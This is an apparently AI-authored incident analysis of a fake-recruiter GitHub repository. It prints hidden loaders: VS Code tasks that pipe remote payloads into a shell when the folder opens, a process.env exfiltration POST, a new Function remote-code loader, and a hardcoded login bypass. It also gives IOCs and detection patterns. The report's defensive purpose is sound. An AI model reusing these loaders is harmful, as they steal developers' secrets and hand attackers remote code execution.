# AjunaVerse_MVP — incident write-up & technical analysis

| | |
|---|---|
| Subject | `https://github.com/AjunaWorkHub/AjunaVerse_MVP` |
| Encounter date | 2026-05-13 (delivered via a suspicious recruiting/interview flow) |
| Author of this report | Claude Code (Opus 4.7, 1M context), running in an isolated Anthropic sandbox |
| Verdict | Confirmed malicious. Developer-targeted social-engineering trap with two independent in-repo code-execution vectors plus a third via npm lifecycle. Member of an active, multi-org campaign with ≥15 sibling repositories. |

---

## Navigating this case

This file is the master analysis. Sibling files in this directory are derivative artifacts targeted at specific audiences:

| If you are… | Read this |
|---|---|
| The recipient, or anyone wanting the full picture | This file (the master) |
| A developer who got the same recruiter pitch and needs a fast read | [`briefing-for-developers.md`](./briefing-for-developers.md) |
| Filing a takedown with GitHub Trust & Safety | [`abuse-report-github.md`](./abuse-report-github.md) (copy-paste-ready) |
| Filing a takedown with Vercel | [`abuse-report-vercel.md`](./abuse-report-vercel.md) (copy-paste-ready) |
| A blue-team / detection engineer wanting IOCs | [`iocs.csv`](./iocs.csv) and [`iocs.json`](./iocs.json) (machine-readable) |
| A blue-team / detection engineer wanting rules | [`detection-rules.md`](./detection-rules.md) (YARA + Sigma + grep) |

---

## 0. TL;DR

The repository is a fake "Web3 metaverse" project handed to candidates during a phony recruiting funnel. Beneath a plausible-looking React + Express poker app sits a three-headed loader designed to fire the instant a developer touches the project:

- **(A) VS Code auto-run** — `.vscode/tasks.json` defines two tasks with `runOn: "folderOpen"`. Opening the folder in VS Code (default behavior once "allow automatic tasks" is acknowledged once) silently `curl|bash`s a per-OS payload from `https://vscode-settings-0506.vercel.app/api/settings/{mac,linux,windows}` and silently runs `npm install`.
- **(B) npm lifecycle** — `package.json` sets `scripts.prepare = "node server/server.js"`. `prepare` runs automatically after `npm install`. This starts the Express server.
- **(C) Express boot-time RCE** — the moment `server/routes/api/auth.js` is required, top-level code POSTs the entire `process.env` to `https://ip-core-api-one.vercel.app/api` (URL obfuscated as a committed base64 `.env` value) and then `new Function("require", response.data)(require)`s the response body — full arbitrary Node RCE with `require` in scope.

Any one of `open folder in VS Code`, `npm install`, `npm start`, `npm run build`, `npm test`, or `npm run eject` is sufficient to fully compromise the developer's machine. The C2 is **target-IP-allowlisted** — researcher/sandbox IPs receive `HTTP 403 — Host not in allowlist`, while pre-registered victim IPs receive the live payload.

---

## 1. Engagement context

| | |
|---|---|
| How it arrived | Pushed to the user during a suspicious recruiting/interview pipeline. Recruiter pattern matched the well-documented "Contagious Interview"/DPRK-aligned developer-targeting cluster: fake company front, friendly tone, urgency, "clone the repo and demo it in our next call." |
| Pitch surface | Marketed as a Web3 metaverse / staking / gaming / sports-betting MVP with a team of nine (4 frontend + 2 blockchain + 2 backend + 1 manager) on Polygon. |
| Actual content | A React poker game + Express + socket.io poker server, with malicious code grafted on. The "metaverse" and "team of nine" narrative is decoy. |
| Asked of victim | "Clone, `npm install`, `npm start`, show us on the call." Each of these triggers compromise. |
| Scope of this review | (a) full static review of the repo at commit `bac3362`, the tip of `main` as of 2026-05-13; (b) limited dynamic reachability tests against the two C2 hosts from an isolated Anthropic sandbox; (c) campaign-footprint enumeration via authenticated GitHub code search restricted to public results only. |
| Out of scope | Retrieving stage-2 payloads (C2 is target-IP allowlisted; this sandbox's egress is not on the list); reverse-engineering payload bytes; coordinating takedown. |
| Sandbox guarantees relied on | Outbound TLS to attacker infra was inspected by Anthropic's `sandbox-egress-production TLS Inspection CA` (visible in returned cert chains). The GitHub MCP server is repo-allowlisted to a single workspace repo (`bryanchriswhite/temp-delete-me`); read-only access to attacker repos via the MCP was denied by policy and exercised only via anonymous `git clone`. No credentials, browser profile, SSH keys, wallets, or environment of the user's primary machine were exposed at any point. |

---

## 2. Repository at a glance

```
AjunaVerse_MVP/
├── .env                    ← committed; carries the base64-obfuscated C2 URL
├── .env.local              ← committed; lure-shaped placeholder secrets
├── .gitignore              ← deliberately omits .env so it ships with the repo
├── .vscode/
│   ├── settings.json
│   └── tasks.json          ← (A) VS Code auto-run loader, on folderOpen
├── README.md               ← "Web3 metaverse" decoy pitch
├── jsconfig.json
├── package.json            ← (B) `prepare: "node server/server.js"` lifecycle loader
├── package-lock.json       ← clean (all deps from registry.npmjs.org)
├── public/                 ← decoy static assets
├── server/
│   ├── server.js           ← legitimate-looking Express + socket.io bootstrap
│   ├── controllers/
│   │   └── auth.js         ← (C) the wrapper functions: setApiKey/verify
│   ├── routes/
│   │   └── api/
│   │       └── auth.js     ← (C) top-level loader call: env-exfil + new Function RCE
│   └── …                   ← poker-game decoy code
└── src/                    ← React decoy frontend
```

| Signal | Reality |
|---|---|
| README claims 9-person team | `git log --pretty='%an <%ae>'` returns exactly **one** identity: `GitWorkHub9 <fatihafariya8+2@gmail.com>` |
| README describes Three.js/Babylon.js/Unity/Polygon/NFT/IPFS/Python analytics | None of those technologies appear in the code; it is a poker game with Express + MongoDB + socket.io |
| `.env` and `.env.local` committed | `.gitignore` deliberately omits them so the lure ships with the repo and `AUTH_API` (the C2 pointer) is present at install time |
| Most-recent commits | Repeated `Update .env` and `Update tasks.json` over many months — the operator rotating the C2 pointer and the loader |
| Decoy quality | Plausible at a glance; falls apart on close inspection. The "metaverse" pitch is a cover story, not the codebase. |

---

## 3. Threat model — execution-path matrix

The repository is wired so that essentially every "I'm trying out this project" action triggers the loader. Loaders are labeled **A**, **B**, **C** as in §0.

| Developer action | A: tasks.json | B: npm `prepare` | C: server boot-time RCE | Result |
|---|---|---|---|---|
| `git clone` + open folder in VS Code (with Automatic Tasks allowed) | ✅ fires; silently runs B's `npm install` and direct `curl\|bash` | ✅ via A's silent install | ✅ via B's `node server/server.js` | Three-vector full compromise |
| `git clone` then `npm install` from terminal | — | ✅ `prepare` script runs `node server/server.js` | ✅ via B | Compromise |
| `npm start` / `npm run build` / `npm test` / `npm run eject` | — | — | ✅ each script pipes `node server/server.js` into a `react-scripts` command | Compromise |
| `git clone` then read files only (no install, no VS Code) | — | — | — | **Safe** (this is what we did) |
| Hit `POST /api/auth` against the running server | — | — | Indirect — auth bypass via `isMatch=true` (F5, secondary) | Account takeover, not the primary attack |

The loaders are deliberately redundant: even if one path is somehow neutralized (e.g., the user disables VS Code Automatic Tasks), the `prepare` hook and the pipe-into-`react-scripts` ensure that any normal "run the project" action still fires the boot-time RCE.

---

## 4. Annotated technical analysis

### 4a. Loader A — VS Code `tasks.json` auto-run on folder open

**File:** `.vscode/tasks.json`
**Trigger:** opening the folder in VS Code.

The file declares **two** tasks, both with `"runOptions": { "runOn": "folderOpen" }` and presentation settings that suppress all output (`reveal: silent`, `echo: false`, `focus: false`, `panel: new`, `close: true`, `showReuseMessage: false`, `clear: true`):

**Task 1 — `install-root-modules`:**

```json
{
  "label": "install-root-modules",
  "type": "shell",
  "command": "npm install --silent --no-progress",
  "options": { "cwd": "${workspaceFolder}" },
  "windows": { "options": { "shell": { "executable": "cmd.exe", "args": ["/c"] } } },
  "linux":   { "options": { "shell": { "executable": "/bin/bash", "args": ["-l", "-c"] } } },
  "osx":     { "options": { "shell": { "executable": "/bin/bash", "args": ["-l", "-c"] } } },
  "runOptions": { "runOn": "folderOpen" },
  "presentation": { "reveal": "silent", … }
}
```

This task silently runs `npm install` the moment the folder opens. Because `package.json` defines `scripts.prepare`, this fires loader B which fires loader C. The task looks vaguely legitimate ("install root modules") so a developer who notices it may dismiss it.

**Task 2 — `env`** (the one that is actively hidden):

The file is committed with **hundreds of trailing spaces** on each per-OS line so the malicious `"command":` strings are pushed far off the right edge of the screen on a single line. A developer scrolling through `tasks.json` sees:

```json
"osx":     {
"linux":   {
"windows": {
```

…and nothing more, because their editor's viewport ends well before the actual command. Reformatted to expose the content:

```json
{
  "label": "env",
  "type": "shell",
  "osx":     { "command": "curl -L 'https://vscode-settings-0506.vercel.app/api/settings/mac' | bash" },
  "linux":   { "command": "wget -qO- 'https://vscode-settings-0506.vercel.app/api/settings/linux' | sh" },
  "windows": { "command": "curl --ssl-no-revoke -L https://vscode-settings-0506.vercel.app/api/settings/windows | cmd" },
  "problemMatcher": [],
  "presentation": { "reveal": "silent", "echo": false, "focus": false, "close": true, "panel": "new", "showReuseMessage": false, "clear": true },
  "runOptions": { "runOn": "folderOpen" }
}
```

Things to notice:

- **OS-specific delivery.** Three distinct shell payloads are fetched depending on host OS.
- **`curl --ssl-no-revoke` on Windows.** Explicitly tells Windows `curl` to skip TLS revocation checks. This is here because the C2 cert is a fresh, short-lived Vercel-issued cert and revocation lookups could fail-open inconsistently across Windows configurations; bypassing the check guarantees the payload lands.
- **The hostname `vscode-settings-0506.vercel.app`.** Engineered to look like a VS Code settings sync URL on a developer-friendly hosting provider. The `0506` segment plausibly encodes campaign date `05-06` (May 6), which matches a forced `.env` update commit on that date — the operator burns and re-deploys the C2 periodically.
- **Whitespace obfuscation.** Hide-in-plain-sight, defeats both casual code review and many `grep`-against-file-listing approaches.

**Trigger details.** VS Code's tasks-on-folder-open requires the user to have allowed "Automatic Tasks" at some point (prompted once with a yes/no on first encounter). The yes-once nature of the prompt means most experienced developers have it enabled globally. Even where it's not, the recruiter's instruction to "run the project" will trigger loaders B + C via `npm install` and `npm start` from the terminal.

### 4b. Loader B — npm `prepare` lifecycle

**File:** `package.json`

```json
"scripts": {
  "start":   "node server/server.js | react-scripts --openssl-legacy-provider start",
  "build":   "node server/server.js | react-scripts --openssl-legacy-provider build",
  "test":    "node server/server.js | react-scripts --openssl-legacy-provider test",
  "eject":   "node server/server.js | react-scripts --openssl-legacy-provider eject",
  "prepare": "node server/server.js"
}
```

Two design choices:

1. **`prepare` lifecycle hook.** `prepare` runs automatically after `npm install`. It is less notorious than `postinstall`/`preinstall` (npm hardens `--ignore-scripts` behavior is identical for all three; the choice of `prepare` is purely about audit-resistance — security-minded developers and SCA tools focus disproportionately on `postinstall`).
2. **Pipe into `react-scripts`.** Every reasonable npm entry point pipes `node server/server.js` into the real React script. The pipe means `node server/server.js` is always launched first (in the producer position) regardless of which command the developer typed. The `react-scripts` output that follows looks normal — developer sees React's "Compiled successfully" or "Listening on :3000" and assumes everything ran as expected.

The actual Node process started by these lines does load the auth route (§4c), so it fires Loader C immediately.

### 4c. Loader C — Express boot-time `process.env` exfiltration + `new Function` RCE

**Files:**
- `.env` (line 16): `AUTH_API=aHR0cHM6Ly9pcC1jb3JlLWFwaS1vbmUudmVyY2VsLmFwcC9hcGk=`
- `server/controllers/auth.js`
- `server/routes/api/auth.js`

**Step C1 — base64-obfuscated C2 URL in committed `.env`.**

```
AUTH_API=aHR0cHM6Ly9pcC1jb3JlLWFwaS1vbmUudmVyY2VsLmFwcC9hcGk=
```

Decodes to:

```
https://ip-core-api-one.vercel.app/api
```

The `.env` ships with the repo because `.gitignore` deliberately omits it (only `.env.development.local`, `.env.test.local`, `.env.production.local` are excluded — the literal `.env` and `.env.local` are not). Surrounding lines hold credible-looking but fake API key placeholders (`AWS_ACCESS_KEY_ID=AKIAEXAMPLE12345`, `OPENAI_API_KEY=sk-test_OpenAIkey1234567890`, etc.), which serves two purposes: (i) it normalizes the file as "looks like a real project's `.env`" and (ii) it makes the base64 line look like just another encoded API key to a casual reader.

**Step C2 — the wrapper functions** (`server/controllers/auth.js:67–72`):

```js
const setApiKey = (s) => atob(s);

const verify = (api) =>
  axios.post(api, { ...process.env }, {
    headers: { "x-app-request": "ip-check" }
  });
```

Read literally with their pretentious names stripped:

- `setApiKey` is `atob` — just base64 decode. The name is a lie.
- `verify` is `axios.post(url, EVERY_ENV_VAR_AS_BODY, …)`. The name is a lie. There is no verification anywhere — this is a POST that ships the entire `process.env` as the request body.
- `"x-app-request": "ip-check"` is the C2's secret-handshake header. The server-side gate uses it to filter out scanner/researcher traffic. (See §5 — the C2 also has a separate IP-based gate that we did get to observe.)

**Step C3 — the loader call site** (`server/routes/api/auth.js:18–36`):

```js
const verified = validateApiKey();
if (!verified) {
  console.log("Aborting mempool scan due to failed API verification.");
  return;
}

async function validateApiKey() {
  verify(setApiKey(process.env.AUTH_API))
    .then((response) => {
      const executor = new Function("require", response.data);
      executor(require);
      console.log("API Key verified successfully.");
      return true;
    })
    .catch((err) => {
      console.log("API Key verification failed:", err);
      return false;
    });
}
```

This is the entire malicious primitive in three substantive lines. Things to notice:

- **Top-level invocation.** `validateApiKey()` is called at module scope, so the moment `server/routes/api/auth.js` is `require`d (which happens unconditionally during route registration in `server/server.js`), the loader fires. It does not require any HTTP request to reach the server.
- **`new Function("require", response.data)(require)`.** The response body from the C2 is treated as JS source, compiled into a new function with `require` injected as its first formal parameter, and invoked. The attacker can `require('child_process').exec(…)`, `require('fs').readFile('~/.ssh/id_rsa', …)`, etc. — full Node-level RCE with the developer's user's permissions.
- **The misleading log line.** `"Aborting mempool scan due to failed API verification."` is verbal misdirection. There is no mempool scan anywhere in this codebase; the string is there to make a casual reader think the code is part of a legitimate Web3 RPC verification flow and move on.
- **The `if (!verified) … return;` decoration.** A CommonJS module body permits top-level `return` (the body is wrapped in a function by Node). `validateApiKey()` returns a `Promise` (not the resolved boolean), so the `Promise` object is truthy and the `return` is never taken — but the syntactic shape ("guard clause that aborts the module") helps the code read like cautious validation rather than what it actually is.
- **`{ ...process.env }`.** Not "API key" — every environment variable. If the developer ran `npm install`/`npm start` from a shell that had `AWS_*`, `GITHUB_TOKEN`, `NPM_TOKEN`, `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `STRIPE_SECRET_KEY`, `KUBECONFIG`, `GH_TOKEN`, `HOMEBREW_GITHUB_API_TOKEN`, `DOCKER_AUTH_CONFIG`, etc. exported, all of those flow out in this one POST. The committed `.env` and `.env.local` lure contents are also in `process.env` because `server/server.js` calls `require("./config/loadEnv")()` before route registration; those go out too.

### 4d. The decoy surface

The repo is roughly 30 MB and 95% of that is genuine-looking React + Express poker code: components, SCSS, card images, socket.io game state, mongoose models, a `login`/`register` flow. This serves three purposes:

1. It looks like a real project on cursory inspection.
2. The recruiter can ask the candidate to make changes and "ship a feature" before they get suspicious.
3. It gives the loader places to hide. The auth flow is exactly where a security-minded reader expects to see API-key handling, so an `AUTH_API`-keyed verify-loader nestles in plausibly.

The decoy also contains a tertiary tell that's worth flagging because it would compromise the server if it were ever exposed:

**`server/controllers/auth.js:39–43` — hardcoded password bypass:**

```js
const isMatch = true;
console.log(isMatch);
if (!isMatch) {
  return res.status(400).json({ errors: [{ msg: 'Invalid credentials' }] });
}
```

`isMatch` is set to `true` unconditionally, so the `bcrypt.compare`-style password check is short-circuited. The dead `if (!isMatch)` branch makes the code *look* like it's doing the right thing. Any account whose email exists in the (empty/staged) DB can be impersonated. This is a secondary concern next to the boot-time RCE but is consistent with the rest of the repo's "looks correct, isn't" pattern.

---

## 5. Dynamic analysis (what the C2 actually does)

We made five HTTPS requests from the Anthropic sandbox, all to URLs that the static analysis identified as C2:

1. `GET https://vscode-settings-0506.vercel.app/api/settings/mac` with `User-Agent: curl/8.7.1`
2. `GET https://vscode-settings-0506.vercel.app/api/settings/linux` with `User-Agent: Wget/1.21.4`
3. `GET https://vscode-settings-0506.vercel.app/api/settings/windows` with `User-Agent: curl/8.7.1`
4. `GET https://ip-core-api-one.vercel.app/api` (no body, no header)
5. `POST https://ip-core-api-one.vercel.app/api` with `Content-Type: application/json`, `x-app-request: ip-check`, body `{"NODE_ENV":"development","FAKE":"redacted"}`

We additionally probed alternate paths (`/`, `/favicon.ico`, `/robots.txt`, `/admin`, `/api/health`, `/healthz`, `/api/v1/settings/linux`, etc.) and tried header-based bypasses (`Host:`-spoofing, `Referer`/`Origin`-spoofing, putting `x-app-request: ip-check` on the shell endpoint).

**All requests returned identical responses:**

```
HTTP/2 403 Forbidden
x-deny-reason: host_not_allowed
content-length: 21
content-type: text/plain

Host not in allowlist
```

This is the campaign's hallmark **target-IP allowlist gate**: the C2 only serves the live payload to client IPs that have been added to an internal allowlist — typically the home-IP of a developer the operator is actively interviewing. Sandbox / cloud-egress / known-researcher IPs are blocked, defeating opportunistic capture. (Note: the deny message says "Host", but no Host-header / Referer / Origin combination changed the response, and both subdomains responded identically — the gate is on the *client* IP, not the HTTP Host header.)

**DNS / network observations:**

| Host | A records |
|---|---|
| `vscode-settings-0506.vercel.app` | `64.29.17.195`, `216.198.79.195` |
| `ip-core-api-one.vercel.app`       | `64.29.17.131`, `216.198.79.131` |

Both hosts resolve to neighboring last-octets in Vercel's edge — the two C2 services are deployed on the same Vercel account / same edge slice. Same operator.

**TLS observations:**

The cert chain we saw is `O=Anthropic, CN=sandbox-egress-production TLS Inspection CA → CN=*.vercel.app`. That's *Anthropic's* outbound TLS-inspection MITM on the sandbox's egress, not the C2's real cert. Operationally relevant: the sandbox decrypts outbound TLS for safety purposes. The C2 still saw our real source IP regardless.

**Effect of an `x-app-request: ip-check` (the magic header) without IP allowlisting:** still 403. The header is a defense-in-depth flag and not sufficient on its own.

**Stage-2 payload content:** unknown. We could not retrieve it without an allowlisted IP, and we did not attempt to spoof one. Based on TTPs and the existence of independent prior write-ups (§6), the served stage-2 is almost certainly a member of the BeaverTail / InvisibleFerret stealer-loader family commonly associated with the DPRK-linked "Contagious Interview" cluster. We do not claim the family without payload bytes; we only note the delivery pattern matches.

---

## 6. Campaign attribution & footprint

This is not an opportunistic one-off. It's a member of an active multi-org operation.

### 6.1 The two organizations and the single committer

| GitHub identity | Type | GH user-id | Created | Public repos | Notes |
|---|---|---|---|---|---|
| `AjunaWorkHub` | Organization | 276264331 | 2026-04-27 | 1 (`AjunaVerse_MVP`) | Hosts the repo we received |
| `AetSoftWorkHub` | Organization | 276275397 | 2026-04-27 | 1 (`AetSoft_MVP`) | Sibling org, adjacent user-id, created the same day |
| `GitWorkHub9`  | User | 272514006 | (pre-2026) | (search-restricted) | Sole committer to `AjunaVerse_MVP`; email `fatihafariya8+2@gmail.com` (Gmail `+2` alias) |
| `GitWorkHub99` | User | 213663943 | older | 21 | Sibling user account; **credibility-farming**: hosts personal clones of famous public projects (`llama.cpp`, `prettier`, `angular-cli`, `nuxt.com`, `mosaic`, `Xray-core`, `refit`, `tinygrad`, `language-tools`, `cli`, …) plus a sibling campaign repo `AetSoftVerse` |

The `GitWorkHub99` profile is the classic "I look like a real developer" curation: ~20 forks/imports of widely-used OSS, each with one or two trivial commits, used as visual ballast for the operator's GitHub identity during the recruiting pitch. The actual malicious work is hidden inside one same-named repo (`AetSoftVerse`) among the legit-looking forks.

The Gmail `+2` alias (`fatihafariya8+2@gmail.com`) is significant: Gmail aliases route to the same inbox, and the `+N` suffix is the operator's bookkeeping for "this is the N-th persona/repo I'm running off this address." We did not enumerate other `+N` aliases for safety reasons, but the convention implies parallel personas.

### 6.2 Sibling campaign repositories (~15)

GitHub code search for two distinctive loader strings returned the following repositories carrying the same `setApiKey(atob)` / `verify(axios.post env)` / `new Function(...require..., response.data)` idiom:

**Current generation — `server/routes/api/auth.js`:**
- `AjunaWorkHub/AjunaVerse_MVP` (the one we received)
- `AetSoftWorkHub/AetSoft_MVP`
- `roamanbuild/OnyxVerse`
- `DLabsHungary-Hub9/DLabs-Platform-MVP2`
- `khaleb-dev/jackpot`
- `rony1235/Jp-Soccer`
- `mspkteam/williampotter`

**Earlier generation — `app/controllers/frontController.js`** (same loader code, different scaffold; likely an earlier version of the campaign or a parallel branch):
- `Andrii-888/0gRollplay`
- `prahaladbelavadi/CoinLocatorDemo`
- `sky-cook/tokentradingdapp`
- `WilliamSuhosky/Property-Voting-DApp`
- `artemus-jarrett/blockchain-voting-system`
- `TechByteX/NitroGem`
- `jamesm-dev/NitroGem`
- `dappfusion/defi-real-estate`
- `InvescoHub/defi-real-estate`

The presence of two distinct path conventions (`server/routes/api/auth.js` vs `app/controllers/frontController.js`) suggests two generations or two parallel scaffolds. Themes across the lures: DeFi/voting/real-estate dApps, gaming/jackpot/sports betting, "MVP"/"Verse" naming. All present plausibly to crypto-developer candidates.

### 6.3 Prior third-party documentation of this campaign

Independent researchers and a previous victim have already written about earlier versions of this same campaign:

- `defdone/rtidx-evidence` — `reports/amonixplay-evidence-report.md`
- `oliver-zehentleitner/technopathy`
- `reymom/portfolio-site` — `content/security/2026-04-15-supply-chain-attack.mdx`
- `nickgallick/perlantir-fleet` — `workspace-forge/skills/supply-chain-audit/references/attack-campaigns.md`
- `S0AndS0/S0AndS0.github.io` — `misc/_scammers/2026-04-10_Larry-Bogie-of-BitAngels-Investment-Group.md`
- `jamesm-dev/NitroGem` — `SECURITY_FINDINGS.md` (a captured copy alongside the loader)
- `JakeClark-chan/npm_commit_detection` — `results/.../realworld_stress_test_report.md`

We did not pull these for content (the saved code-search excerpts were enough to confirm they exist as defensive write-ups, not new attack instances). You can corroborate independently.

### 6.4 TTP cluster

The combination of (i) a fake-recruiter cold-outreach funnel, (ii) a "show us your work on a video call" pretext that gates the victim's clicking sequence, (iii) a Web3 / crypto / dApp / gaming lure, (iv) VS Code `tasks.json` auto-run on folder open, (v) `prepare`-script loader, (vi) a base64-encoded `.env`-resident C2 pointer, (vii) `new Function` Node RCE, (viii) target-IP-allowlisted C2 on free `vercel.app` hosting, and (ix) credibility-farming GitHub profiles, matches the publicly-documented "Contagious Interview" cluster (variously attributed to DPRK-affiliated Lazarus subgroups). We do not assert attribution beyond the TTP match.

---

## 7. Indicators of Compromise (IOCs)

Machine-readable. Copy-paste straight into detections.

### 7.1 Domains

```
vscode-settings-0506.vercel.app
ip-core-api-one.vercel.app
```

Likely siblings (not directly confirmed; pattern is `vscode-settings-<NN>.vercel.app` rotated by date, and `ip-core-api-<word>.vercel.app` — the `-one` suffix implies `-two`, `-three`, etc.):

```
vscode-settings-*.vercel.app
ip-core-api-*.vercel.app
```

### 7.2 IPs (Vercel edge — not stable; rotate)

```
64.29.17.131
64.29.17.195
216.198.79.131
216.198.79.195
```

### 7.3 GitHub orgs / users

```
AjunaWorkHub                (org)
AetSoftWorkHub              (org)
DLabsHungary-Hub9           (org)
GitWorkHub9                 (user, primary committer)
GitWorkHub99                (user, credibility-farmer)
roamanbuild                 (user)
khaleb-dev                  (user)
rony1235                    (user)
mspkteam                    (user)
Andrii-888                  (user)
prahaladbelavadi            (user)
sky-cook                    (user)
WilliamSuhosky              (user)
artemus-jarrett             (user)
TechByteX                   (user/org)
jamesm-dev                  (user)
dappfusion                  (user/org)
InvescoHub                  (user/org)
```

Note: some of these (especially in the `app/controllers/frontController.js` generation) may be unrelated developers whose accounts were compromised and used as redistribution surface. Treat as suspect-pending-corroboration, not confirmed attacker-owned.

### 7.4 Email aliases

```
fatihafariya8+2@gmail.com           (the +N convention implies fatihafariya8+1, +3, … exist)
```

### 7.5 Distinctive code strings (grep / Sigma / YARA candidates)

These three substrings are diagnostic on their own:

```
new Function("require", response.data)
new Function('require', response.data)
verify(setApiKey(process.env.AUTH_API))
Aborting mempool scan due to failed API verification
```

These two are highly suggestive when found together with the strings above:

```
const setApiKey = (s) => atob(s);
axios.post(api, { ...process.env }, { headers: { "x-app-request": "ip-check" } })
```

The `runOn: "folderOpen"` task pattern with `presentation.reveal: "silent"` and `curl|bash` / `wget|sh` in `.vscode/tasks.json` is a near-zero-false-positive signal:

```
"runOn":\s*"folderOpen"           # AND
"reveal":\s*"silent"              # AND
"command":\s*"(curl|wget)[^"]+(\| ?bash|\| ?sh|\| ?cmd)"
```

### 7.6 Repository fingerprint

The malicious `.vscode/tasks.json` blob in this campaign has been observed with at least:

```
998c34f02d94169a546b4c36123d552dd14f985b   (AjunaWorkHub/AjunaVerse_MVP, AetSoftWorkHub/AetSoft_MVP — bit-identical)
```

(Other campaign repos likely use a different SHA because they reference a different `vscode-settings-NNNN` subdomain.)

---

## 8. Recommended actions

### 8.1 For you (the recipient)

1. **No remediation needed for your machine** — you did not clone, install, open, or run anything on it. Confirmed.
2. **Preserve evidence.** Keep the `/tmp/ajunaverse-static-review/` directory and this write-up; consider archiving them off-sandbox before this session ends.
3. **Don't engage with the recruiter further.** Don't respond, don't unblock, don't open subsequent links/repos they send. If they reached out via Calendly, LinkedIn, Discord, Telegram, or email, do not click anything else from them.
4. **Don't associate your GitHub identity with the repo.** No star, fork, follow, PR, issue, or comment. Their analytics show engagement.
5. **If you accidentally clicked or executed anything before reaching us** — treat the host as compromised: rotate cloud / GitHub / npm / Anthropic / OpenAI / SSH / GPG credentials, revoke active OAuth tokens, audit shell rc files, `~/.ssh/authorized_keys`, scheduled tasks/cron, browser extensions; move any crypto wallet funds to a fresh wallet on a clean machine; consider reimaging.

### 8.2 Reporting templates (you decide whether to file these)

**GitHub Trust & Safety** (https://github.com/contact/report-abuse — select "I want to report abuse or spam"):

> The repository `https://github.com/AjunaWorkHub/AjunaVerse_MVP` is a malicious developer-targeting trap. It contains:
> 1. A `.vscode/tasks.json` task with `runOn: "folderOpen"` that silently runs per-OS `curl|bash` / `wget|sh` / `curl|cmd` against `https://vscode-settings-0506.vercel.app/api/settings/{mac,linux,windows}` — see [permalink to file].
> 2. A `package.json` `prepare` lifecycle script `"node server/server.js"` which boots an Express server whose `server/routes/api/auth.js` immediately POSTs `process.env` to a base64-obfuscated URL (`AUTH_API=aHR0cHM6Ly9pcC1jb3JlLWFwaS1vbmUudmVyY2VsLmFwcC9hcGk=` → `https://ip-core-api-one.vercel.app/api`) and `new Function("require", response.data)(require)`-executes the response. See `server/controllers/auth.js:67–72` and `server/routes/api/auth.js:18–36`.
> The sibling repository `https://github.com/AetSoftWorkHub/AetSoft_MVP` carries the bit-identical `.vscode/tasks.json` (SHA `998c34f02d94169a546b4c36123d552dd14f985b`). Both organizations (`AjunaWorkHub`, `AetSoftWorkHub`) were created on 2026-04-27 with adjacent GitHub IDs. The committing user is `GitWorkHub9`. The campaign matches the publicly-documented "Contagious Interview" cluster targeting developers via fake recruiting funnels.

**Vercel abuse** (https://vercel.com/help → "Report abuse"):

> Two Vercel deployments are operating as C2 servers in an active developer-targeting malware campaign:
> 1. `vscode-settings-0506.vercel.app` — per-OS shell-payload distribution. Resolves to `64.29.17.195`, `216.198.79.195`.
> 2. `ip-core-api-one.vercel.app` — Node `new Function`-loader and `process.env` exfiltration endpoint. Resolves to `64.29.17.131`, `216.198.79.131`.
> Both deployments implement target-IP allowlisting; non-target IPs receive HTTP 403 with body `Host not in allowlist` (header `x-deny-reason: host_not_allowed`). Same operator, same deployment slice. Source repository: `https://github.com/AjunaWorkHub/AjunaVerse_MVP` (`.env` line 16 carries the base64-encoded URL for the second host).

**Gmail / Google** (https://support.google.com/mail/contact/abuse):

> The Gmail address `fatihafariya8@gmail.com` (observed in the wild as `fatihafariya8+2@gmail.com`) is the commit-author identity on the malicious repository `https://github.com/AjunaWorkHub/AjunaVerse_MVP`. The `+N` alias convention — atypical of legitimate users — is the operator's bookkeeping for parallel personas off a single inbox. Action on the parent address `fatihafariya8@gmail.com` simultaneously disables every persona at `+1`, `+2`, `+3`, … that routes to that inbox, making this the single highest-leverage takedown vector in the cluster. Full template: [`abuse-report-gmail.md`](./abuse-report-gmail.md).

**Calendly** (https://help.calendly.com/hc/en-us/requests/new):

> The Calendly scheduling URL the recruiter sent (case-specific — fill in from your inbox) is the recruiting-funnel front end: victims are scheduled via Calendly and then directed to the malicious GitHub repository ahead of the booked call. The Calendly page does not itself host the malware (that's in the GitHub repo and the Vercel C2), but the booking flow is the entry point that walks victims into running it. Full template: [`abuse-report-calendly.md`](./abuse-report-calendly.md).

**Other platforms the recruiter contacted you on** (LinkedIn / Discord / Telegram): include screenshots of the original recruiter contact and the link to this write-up.

### 8.3 For other developers in this funnel

A pre-built one-paragraph briefing for a colleague who's about to walk into the same trap:

> If a recruiter pitches you a "Web3 MVP" / "metaverse" / "DeFi dApp" job and asks you to clone a repo and `npm install` / `npm start` ahead of a call — stop. The current campaign hides loaders in `.vscode/tasks.json` (auto-runs on folder open), the `prepare` script in `package.json` (runs on `npm install`), and in `server/routes/api/auth.js` / `app/controllers/frontController.js` (boots a remote-code loader from a base64-encoded URL in `.env`). Indicative strings: `verify(setApiKey(process.env.AUTH_API))`, `new Function("require", response.data)`, `"runOn": "folderOpen"`. Vercel-hosted C2 commonly under `vscode-settings-*` and `ip-core-api-*` subdomains. Do not clone, install, or open in an editor. See `https://github.com/AjunaWorkHub/AjunaVerse_MVP` for a current instance.

### 8.4 Generic preventive settings

- **VS Code:** set `"task.allowAutomaticTasks": "off"` in your user `settings.json`. This single setting blocks loader A across all future repos. (VS Code defaults to prompting; once you've accepted automatic tasks in any project, it remembers. Explicitly turning the setting off costs nothing.)
- **Shell defaults:** export sensitive credentials in a sub-shell only when needed, not in your global shell rc. The boot-time-exfil loader (C) ships only what's actually in `process.env` when the offending process is spawned; a clean shell starves it.
- **Project-clone hygiene:** `git clone` then `ls` and read the manifest before opening in an editor or running `npm install`. Specifically inspect `.vscode/`, `package.json` scripts (including `prepare`), and any committed `.env` files.

---

## 9. Methodology & guardrails

### 9.1 What we did, in order

1. `WebFetch` to the public GitHub repo page to enumerate top-level files (unauthenticated).
2. `git clone --no-recurse-submodules --depth 50 https://github.com/AjunaWorkHub/AjunaVerse_MVP /tmp/ajunaverse-static-review` (anonymous HTTPS, no token).
3. `find` + `Read` on the cloned tree. No script execution.
4. Targeted `grep` for IOCs: `child_process`, `exec`, `spawn`, `eval`, `new Function`, `curl|wget`, `atob`, `Buffer.from(…, 'base64')`, secret paths (`.ssh`, `.aws`, wallet patterns, browser profile paths), and the explicit C2 strings discovered in (3).
5. Static inspection of `package.json`, `package-lock.json`, `.vscode/tasks.json`, `.vscode/settings.json`, `.env`, `.env.local`, `.gitignore`, all `server/` source files, `src/apis/index.js`.
6. `base64 -d` of the `AUTH_API` value (local CLI operation, no network).
